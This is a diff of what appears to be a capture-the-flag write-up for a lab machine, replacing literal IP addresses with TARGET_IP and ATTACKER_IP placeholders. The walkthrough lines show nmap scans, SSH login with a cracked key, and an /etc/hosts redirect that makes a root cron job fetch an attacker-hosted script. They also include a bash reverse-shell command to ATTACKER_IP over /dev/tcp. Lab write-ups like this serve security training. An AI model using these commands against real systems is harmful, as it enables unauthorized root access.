@@ -19,7 +19,7 @@ $ sudo openvpn --config NovusEdge.ovpn
 
 Starting off with some `nmap` scans:
 ```shell-session
-$ sudo nmap -sV -vv --top-ports 2000 -oN nmap_scan.txt 10.10.127.231
+$ sudo nmap -sV -vv --top-ports 2000 -oN nmap_scan.txt TARGET_IP
 ...
 
 PORT   STATE SERVICE REASON         VERSION
@@ -28,7 +28,7 @@ PORT   STATE SERVICE REASON         VERSION
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 # Vuln script scan:
-$ sudo nmap -sC -vv --script=vuln -p22,80 -oN nmap_vulnscan.txt 10.10.127.231
+$ sudo nmap -sC -vv --script=vuln -p22,80 -oN nmap_vulnscan.txt TARGET_IP
 ...
 PORT   STATE SERVICE REASON
 22/tcp open  ssh     syn-ack ttl 63
@@ -106,7 +106,7 @@ james13          (sshkey.rsa)
 
 With this passphrase, we can now `ssh` into the machine as james:
 ```shell-session
-$ ssh -i sshkey.rsa james@10.10.127.231
+$ ssh -i sshkey.rsa james@TARGET_IP
 Enter passphrase for key 'sshkey.rsa':
 ...
 
@@ -148,7 +148,7 @@ There's a `cron` job that runs as root. Unfortunately we cannot edit this script
 ```shell-session
 127.0.0.1 localhost
 127.0.1.1 overpass-prod
-10.14.45.44 overpass.thm
+ATTACKER_IP overpass.thm
 # The following lines are desirable for IPv6 capable hosts
 ::1     ip6-localhost ip6-loopback
 fe00::0 ip6-localnet
@@ -162,7 +162,7 @@ Editing the `/etc/hosts` file and redirecting the overpass.thm domain to our own
 # On our machine:
 $ mkdir -p downloads/src 
 $ cd downloads/src
-$ echo "bash -i >& /dev/tcp/10.14.45.44/4444 0>&1" > buildscript.sh
+$ echo "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" > buildscript.sh
 $ chmod +x /downloads/src/buildscript.sh
 $ python3 -m http.server 80 
 
